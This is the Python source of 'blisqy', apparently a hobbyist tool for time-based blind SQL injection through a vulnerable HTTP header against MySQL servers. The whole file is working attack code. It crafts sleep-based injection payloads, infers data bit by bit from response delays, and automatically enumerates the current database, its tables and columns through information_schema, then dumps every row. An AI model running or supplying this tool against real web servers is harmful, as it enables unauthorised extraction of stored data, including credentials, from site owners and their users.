#!/usr/bin/python

## Writer : John Troony
## Online-handle : @johntroony
## Version : Beta
## Purpose : <put any good reason here>
## Comment : I fucking love binary operations <3
##           Can someone make this a little faster?


from socket import (socket, AF_INET, SOCK_STREAM )
import optparse
import time
import sys

def testSql(sql,sleepTime):
    '''Time-based BlindSQLi Test. If it takes time (> sleepTime) to execute a query then True, else False '''

    # Connect to webserver
    try:
        s = socket(AF_INET,SOCK_STREAM, 0)
        s.connect((server,port))

        # Mark time before execution
        t1 = time.time()
        try:
            injection = SQLinject       

            injection = injection.replace("*sql*", sql)
            injection = injection.replace("*time*", str(sleepTime))
        except Exception as error:
            print red + str(error) + clear
            sys.exit(0)
                
        # Send our Payload
        data = ""
        data += "GET / HTTP/1.1\r\n"
        data += "Host: "
        data += server+"\r\n"
        data += vulnHeader
        data += ": "
        data += headerValue+injection+"\r\n"
        data += "Connection: close\r\n\r\n"
        
        s.send(data)
        s.recv(0)
    
        # Mark time after execution
        t2 = time.time()
    
        # Compare if time diffrence is greater than sleepTime
        if t2-t1 > sleepTime:
            return True
        else:
            return False
            
    except Exception as error:
        print red + str(error) + clear


def constructor(x,inj,sleepTime):
    '''Use bit masking to retrieve each bit value of a character and rebuild its ACII equivalent'''

    strx = ""

    # values for bit masking `for x in range(0,8): 2**x`
    for i in (1,2,4,8,16,32,64,128):
        
        # If injection worked with the bit mask on, True=1, else False=0; Append on strx
        if testSql("select ascii(substring((%s),%s,1))&%s" % (inj,x,i),sleepTime) == True:
            strx+="1"
        else:
            strx+="0"

    #Get integer value from binary value stored at strx
    ascy = int(strx,2)

    # Since value is stored in revrse order, rearrange the byte order
    revAscy = int('{:08b}'.format(ascy)[::-1],2)
    
    # Get ASCII value
    alpha = chr(revAscy)
    
    # If string terminator == ascii, signal for a break in the while loop
    if alpha == "\0":
        return "done"
    else:
        return alpha

def DataPump(x,payload,sleepTime):
    '''Sends SQL Payload to function constructor() to construct the response/result from DB'''
           
    result = ""
    
    while True:
        try:
            if constructor(x,payload,sleepTime) != "done":
                xf = constructor(x,payload,sleepTime)
                result+=xf
                x+=1
            elif result == "done":
                print red + "[-] Nothing found!" + clear
                break
            else:
                return result
                break 
        except KeyboardInterrupt:
            print "Key-board Interrupt"
            print "stopping....."
            exit()

def StatusUpdate(payload):
    '''Prints an update of what Blisqy is doing...'''
    print cyan+"Extracting Data from ====> %s : %s %s" % (server,port,clear) 
    print green + "Current Payload : " + clear + red + payload + clear
    breaker = cyan + "==================================================================" + clear
    print breaker

def BreakPoint(message):
    '''When --interactive option is set to on, this function helps Blisqy pause execution and 
        the user decide on what Blisqy should do next. '''

    print "\n"
    userAction =  yellow + message + clear
    ans = raw_input(userAction)
    #ans = ans.tolower()
    if (ans == "n") | (ans == "no"):
        msg=  yellow + "Close Sessions? yes/no : " + clear
        action = ans = raw_input(msg)
        
        if (action == "y") | (action == "yes"):
            sys.exit()


def tableDigger(table,interactive):
    '''This function is responsible for enumerating tables in a Schema/DB and pulling data from the identified tables. '''

    print cyan + "Preparing to Enumerate Table : %s" % table + clear
    line = cyan + "=====================================================" + clear
    print line
    
    # Get Number of Columns in a Table
    print green + "[+] Getting Number of Columns in Table : %s" % table + clear
    CountColumns = "SELECT count(*) from (SELECT column_name FROM information_schema.columns WHERE table_name = '%s') t" % table
    CountedColumns = DataPump(x,CountColumns,sleepTime)
   
    print yellow + "[-] " + CountedColumns + clear
    print "\n"

    columns = []
    counter = 1
    
    # Get column names and put in a list columns
    print green + "[+] Getting  all Column Names in Table : %s " % table + clear
                   
    while counter <= int(CountedColumns):
        GetColumn = "select column_name FROM (select column_name FROM information_schema.columns WHERE table_name='%s' AND table_schema != 'mysql' AND table_schema != 'information_schema' order by column_name limit %d) t order by column_name desc limit 1" % (table,counter)
        column = DataPump(x,GetColumn,sleepTime)
        print yellow + "[-] " + column + clear
        columns.append(column)
        counter = counter +1
    
    print "\n"
          
    # Get all rows in a Table
    print green + "[+] Getting number of Rows in Table : %s " % table + clear
    allRows = "select count(*) from (select * from %s) t" % table
    CountedRows = DataPump(x,allRows,sleepTime)
    print yellow + "[-] " + CountedRows + clear
    print "\n"

    rows = []
    counter = 1
    
    interactive = interactive.lower()

    if interactive == "on":
        # Get all data from rows
        print green + "[+] Getting data from Table : %s " % table + clear
        outMsg = red + "Enter Columns separated by an asterisk (*). e.g id*fname*passwd or skip : " + clear
        OutputColumns = raw_input(outMsg)
        outMsgColums = OutputColumns.replace("*"," : ")
        
        
        if OutputColumns != 'skip':
            print cyan + "[-] %s" % outMsgColums
            OutputColumns = OutputColumns.replace("*",",' : ',")
            
            while counter <= int(CountedRows):
                getRow = "select result from (select concat(%s) result from %s order by result limit %d) t order by result desc limit 1" % (OutputColumns,table,counter)
                row = DataPump(x,getRow,sleepTime)
                print yellow + "[-] " + row + clear
                rows.append(row)
                counter = counter +1
        
        
        elif OutputColumns == 'skip':
            print red + "Skipping....." + clear


    elif interactive == "off":
        print green + "[+] Getting data from Table : %s " % table + clear
        # Concat all Columns
        query_colums = ''
        for discovered_column in columns:
            query_colums += discovered_column+",':',"

        query_colums = query_colums[:-5]

        outMsgColums = query_colums.replace(",':',",":")
        print cyan + "[-] %s" % outMsgColums

        while counter <= int(CountedRows):
            getRow = "select result from (select concat(%s) result from %s order by result limit %d) t order by result desc limit 1" % (query_colums,table,counter)
            row = DataPump(x,getRow,sleepTime)
            print yellow + "[-] " + row + clear
            rows.append(row)
            counter = counter +1


def MysqlDigger(sleepTime,interactive):
    '''This function automates the process of enumerating all availabe tables in a DB/Schema and calls 
       tableDigger() to pull data from the identified tables. '''


    # Get Current Database
    print green + "[+] Getting Current Database : " + clear
    
    try:
        currentDB = "select database()"
        DBname = DataPump(x,currentDB,sleepTime)
       
        print yellow + "[-] " + DBname + clear
        print "\n"
        
        
        # Count number of TABLES available in non system schema (to be used in getting tableNames)
        print green + "[+] Getting  number of TABLES from Schema " + clear
        
        tableCount = "select count(*) from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema') t"
        CountedTables = DataPump(x,tableCount,sleepTime)
        
        print yellow + "[-] " + CountedTables + clear
        print "\n"
        
        counter = 1
        tables = []

    except Exception as err:
        print err
    
    # Get all TABLE_NAMES from schema, increment inner limit till total counted TABLES available
    print green + "[+] Getting  all TABLE NAMES from Schema " + clear
    
    try:
        while counter <= int(CountedTables):
            GetTableName = "select table_name from (SELECT table_name FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema' order by table_name limit %d) t order by table_name desc limit 1" % counter
            TableName = DataPump(x,GetTableName,sleepTime)
            
            print yellow + "[-] " + TableName + clear
            
            tables.append(TableName)
            counter = counter +1


        # Get all TABLE_NAMES from all Columns from discovered Tables
        if interactive == "on":
            
            msg = "Get all Columns from discovered Tables? yes/no  :  "
            BreakPoint(msg)
            print "\n"
        
            msgout = green + "[+] Enumerate a Specific Table (yes/no) : " + clear
            ans = raw_input(msgout)
            ans = ans.lower()

            if (ans == "y") | (ans == "yes") :
                msgout = green + "[+] Enter Table Name : " + clear
                userTable = raw_input(msgout)

                # Check if table is in list tables before movin on
                while userTable not in tables:
                    msgout = red + "[+] Are you nutts! Enter a valid Table Name : " + clear
                    userTable = raw_input(msgout)
                
                tableDigger(userTable,interactive)
                sys.exit()


            elif (ans == "n") | (ans == "no")  :
                for table in tables:
                    tableDigger(table,interactive)
                
        elif interactive == "off":
            for table in tables:
                tableDigger(table,interactive)
            
    except Exception as err:
        print err


if __name__ == '__main__':
    '''Are we imorted or executed? If executed, start from here (entry point)'''
       
    value = 0
    x = 1
    
    #Colors for Notifications and Errors
    red = "\x1b[1;31m"
    cyan = "\x1b[1;36m"
    green = "\x1b[1;32m"
    yellow = "\x1b[1;33m"
    clear = "\x1b[0m"
    
    # Check if options are correctly passed
    parser = optparse.OptionParser('blisqy.py --server <Web Server> --port <port> --header <vulnerable header> --hvalue <header value> --inject <point of injection>  --payload <custom sql payload> --dig <yes/no> ')
    
    parser.add_option('--server', dest='Webserver', type='string', help='Specify host (web server) IP')
    parser.add_option('--port', dest='Port', type='int', help='Specify port')
    parser.add_option('--header', dest='VulnHeader', type='string', help='Provide a vulnerable HTTP Header')
    parser.add_option('--hvalue', dest='HeaderValue', type='string',help='Specify the value for the vulnerable header')
    parser.add_option('--inject', dest='Injection', type='string', help='Provide where to inject Sqli payload')
    parser.add_option('--payload', dest='Payload', type='string', help='Provide SQL statment/query to inject as payload')
    parser.add_option('--dig', dest='Digger', type='string', help='Automatic Mysql-Schema enumeration (takes time!)' )
    parser.add_option('--sleeptime', dest='Sleep', type='float', help='Sleep-Time for blind-SQLi query (default : 0.9)')
    parser.add_option('--interactive', dest='interact', type='string', help='Turn interactive mode on/off (default : off)')
    (options, args) = parser.parse_args()
    
    global server
    global port
    global vulnHeader
    global headerValue
    global payload
    global SQLinject
    global mysqldig
    
    
    server = options.Webserver
    port = options.Port
    vulnHeader = options.VulnHeader
    headerValue = options.HeaderValue
    payload = options.Payload
    SQLinject = options.Injection
    mysqldig = options.Digger
    sleepTime = options.Sleep
    interactive = options.interact

    if (SQLinject == None):
        # We expect something like "' or if((*sql*),sleep(*time*),0) and '1'='1"
        print yellow + "Please Provide Where to Inject SQL Payloads.. --inject" + clear
        print "\n"
        print yellow + "For Example :" + clear
        print cyan + "' or if(("+red+"*sql*"+clear+cyan+"),sleep("+red+"*time*"+clear+cyan+"),0) and '1'='1" + clear
        print "\n"
        print green + red+"*sql*"+clear+green+" : This is where SQL Payloads will be inserted" + clear
        print green + red+"*time*"+clear+green+" : This is where Time-Based test will be inserted" + clear
        sys.exit(0)

    if (sleepTime == None):
        sleepTime = 0.5
    
    if (interactive == None):
        interactive = "off"


    if (server == None) | (port == None) | (vulnHeader == None) | (headerValue == None ):
        print yellow + "Please Provide All Required Arguments!" + clear
        print red+"USAGE:"+clear
        print cyan + parser.usage + clear
        sys.exit(0)
               
    elif (payload != None) & (mysqldig == None):
        StatusUpdate(payload)
        SqlQuery = DataPump(x,payload,sleepTime)
        print yellow + SqlQuery + clear
        
    elif (mysqldig == "yes") | (mysqldig == "Yes") | (mysqldig == "YES" ):
        MysqlDigger(sleepTime,interactive)